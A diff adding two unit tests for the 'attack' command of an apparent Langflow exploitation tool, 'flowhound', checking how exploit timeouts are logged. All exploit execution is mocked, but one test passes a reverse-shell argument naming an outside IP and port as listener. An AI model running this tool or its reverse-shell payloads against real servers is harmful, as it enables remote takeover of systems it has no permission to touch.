@@ -487,6 +487,75 @@ def test_exploit_timeout_continues_to_next():
     assert result.exit_code == 0
 
 
+def test_exploit_timeout_blocking_payload_reports_success(caplog):
+    """FutureTimeoutError with a blocking payload should be treated as success."""
+    import logging
+    from concurrent.futures import TimeoutError as FutureTimeoutError
+
+    runner = CliRunner()
+    mock_vuln = MagicMock()
+    mock_vuln.cve_id = "CVE-2026-9198"
+    mock_vuln.application = "langflow"
+    mock_vuln.min_impacted_version = "1.0.0"
+    mock_vuln.max_impacted_version = "2.0.0"
+
+    db = MagicMock(spec=Database)
+    db.retrieve_vulnerabilities.return_value = [mock_vuln]
+
+    with (
+        patch(
+            "flowhound.cli.command.detect_target", return_value=("langflow", "1.0.0")
+        ),
+        patch(
+            "flowhound.cli.command._execute_exploit",
+            side_effect=FutureTimeoutError(),
+        ),
+        caplog.at_level(logging.INFO, logger="flowhound.cli.command"),
+    ):
+        result = runner.invoke(
+            attack,
+            [
+                "--url",
+                "http://localhost:7860",
+                "--reverse_shell",
+                "9.61.10.227:4444",
+            ],
+            obj=db,
+        )
+    assert result.exit_code == 0
+    assert "blocking payload is still executing" in caplog.text
+
+
+def test_exploit_timeout_non_blocking_payload_reports_skip(caplog):
+    """FutureTimeoutError without a blocking payload logs the skip warning."""
+    import logging
+    from concurrent.futures import TimeoutError as FutureTimeoutError
+
+    runner = CliRunner()
+    mock_vuln = MagicMock()
+    mock_vuln.cve_id = "CVE-2026-9999"
+    mock_vuln.application = "langflow"
+    mock_vuln.min_impacted_version = "1.0.0"
+    mock_vuln.max_impacted_version = "2.0.0"
+
+    db = MagicMock(spec=Database)
+    db.retrieve_vulnerabilities.return_value = [mock_vuln]
+
+    with (
+        patch(
+            "flowhound.cli.command.detect_target", return_value=("langflow", "1.0.0")
+        ),
+        patch(
+            "flowhound.cli.command._execute_exploit",
+            side_effect=FutureTimeoutError(),
+        ),
+        caplog.at_level(logging.WARNING, logger="flowhound.cli.command"),
+    ):
+        result = runner.invoke(attack, ["--url", "http://localhost:7860"], obj=db)
+    assert result.exit_code == 0
+    assert "timed out after" in caplog.text
+
+
 # --- credentials-detected warning -------------------------------------------
 
 
